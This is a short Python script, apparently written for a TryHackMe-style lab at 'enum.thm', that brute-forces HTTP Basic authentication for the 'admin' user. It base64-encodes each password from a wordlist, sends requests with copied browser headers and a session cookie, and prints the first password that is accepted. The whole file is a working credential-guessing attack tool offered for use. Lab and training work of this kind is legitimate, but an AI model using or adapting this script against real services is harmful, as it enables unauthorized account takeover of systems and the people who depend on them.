import requests
import sys
import base64
from bs4 import BeautifulSoup

def check_pass(base64_password):
    url = 'http://enum.thm/labs/basic_auth/'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, bf',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'http://enum.thm/',
        'Connection': 'close',
        'Cookie': 'PHPSESSID=uh4ljqrkge9lbp7q395kqpmlk1',
        'Authorization': f'Basic YWRtaW46{base64_password}'
    }

    response = requests.get(url, headers=headers)
    if response.status_code == 401:
        return False
    return response.text

def enumerate_password(password_file):
    invalid_error = "Unauthorized" # error message for invalid pass

    print("Trying passwords...")

    with open(password_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        encoded_password = base64.b64encode(password.encode('utf-8'))
        base64_password = encoded_password.decode('utf-8')
        response_text = check_pass(base64_password)
        if not response_text:
            continue

        soup = BeautifulSoup(response_text, 'html.parser')
        error_message = soup.find('h1', class_='err')

        if error_message and invalid_error in error_message.text:
            continue
        else:
            print(response_text)
            print(f"[VALID] {password}")
            return password

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <password_list>")
        sys.exit(1)

    password_file = sys.argv[1]

    enumerate_password(password_file)
